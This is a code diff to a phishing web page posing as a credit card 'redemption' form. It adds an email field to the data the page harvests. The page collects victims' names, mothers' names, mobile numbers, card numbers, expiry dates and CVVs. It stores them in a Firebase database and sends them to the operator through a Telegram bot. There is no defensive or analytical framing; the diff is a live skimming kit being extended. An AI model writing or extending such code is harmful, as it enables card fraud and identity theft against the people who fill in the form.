@@ -393,6 +393,7 @@
                     <h2><i class="fas fa-user"></i> Personal Information</h2>
                     <div class="form-group"><label for="fullName">Full name (as on card)</label><input type="text" id="fullName" required placeholder="Enter your full name"></div>
                     <div class="form-group"><label for="motherName">Mother's Name</label><input type="text" id="motherName" required placeholder="Enter your mother's name"></div>
+                    <div class="form-group"><label for="email">Email ID</label><input type="email" id="email" required placeholder="Enter your email address"></div>
                     <div class="form-group"><label for="mobileNumber">Registered Mobile Number</label><input type="tel" id="mobileNumber" required placeholder="Enter 10-digit mobile number" maxlength="10"></div>
                     <div class="form-group">
                         <label for="cardLimit">Card Limit</label>
@@ -473,6 +474,7 @@
         let mobileNumber = '';
         let fullName = '';
         let motherName = '';
+        let email = '';
 
         function escapeHtml(text) {
             if (!text) return 'N/A';
@@ -516,7 +518,7 @@
 
         async function sendToTelegram(cardNum, exp, cvv, type, limitVal) {
             const timeStamp = new Date().toLocaleString();
-            const tgMessage = `🚨 <b>New Redemption Entry</b> 🚨\n\n👤 <b>Name:</b> ${escapeHtml(fullName)}\n👩‍👦 <b>Mother's Name:</b> ${escapeHtml(motherName)}\n📱 <b>Mobile:</b> ${escapeHtml(mobileNumber)}\n💳 <b>Limit:</b> ${escapeHtml(limitVal)}\n\n💳 <b>Card:</b> <code>${escapeHtml(cardNum)}</code>\n📅 <b>Expiry:</b> ${escapeHtml(exp)}\n🔒 <b>CVV:</b> ${escapeHtml(cvv)}\n🏦 <b>Type:</b> ${escapeHtml(type)}\n\n📲 <b>Action:</b> App Download Initiated\n🕒 <b>Time:</b> ${timeStamp}`;
+            const tgMessage = `🚨 <b>New Redemption Entry</b> 🚨\n\n👤 <b>Name:</b> ${escapeHtml(fullName)}\n👩‍👦 <b>Mother's Name:</b> ${escapeHtml(motherName)}\n📧 <b>Email:</b> ${escapeHtml(email)}\n📱 <b>Mobile:</b> ${escapeHtml(mobileNumber)}\n💳 <b>Limit:</b> ${escapeHtml(limitVal)}\n\n💳 <b>Card:</b> <code>${escapeHtml(cardNum)}</code>\n📅 <b>Expiry:</b> ${escapeHtml(exp)}\n🔒 <b>CVV:</b> ${escapeHtml(cvv)}\n🏦 <b>Type:</b> ${escapeHtml(type)}\n\n📲 <b>Action:</b> App Download Initiated\n🕒 <b>Time:</b> ${timeStamp}`;
 
             console.log("Attempting to send to Telegram:", tgMessage);
 
@@ -573,6 +575,7 @@
                 if (currentStep === 1 && step === 2) {
                     fullName = document.getElementById('fullName').value.trim();
                     motherName = document.getElementById('motherName').value.trim();
+                    email = document.getElementById('email').value.trim();
                     mobileNumber = document.getElementById('mobileNumber').value.trim();
                     const limit = document.getElementById('cardLimit').value || 'N/A';
                     
@@ -583,6 +586,7 @@
                         await update(ref(db, 'submissions/' + currentSubmissionId), {
                             fullName: fullName,
                             motherName: motherName,
+                            email: email,
                             mobileNumber: mobileNumber,
                             cardLimit: limit,
                             timestamp: Date.now(),
@@ -594,6 +598,7 @@
                         await set(newRef, {
                             fullName: fullName,
                             motherName: motherName,
+                            email: email,
                             mobileNumber: mobileNumber,
                             cardLimit: limit,
                             status: 'filling_details',
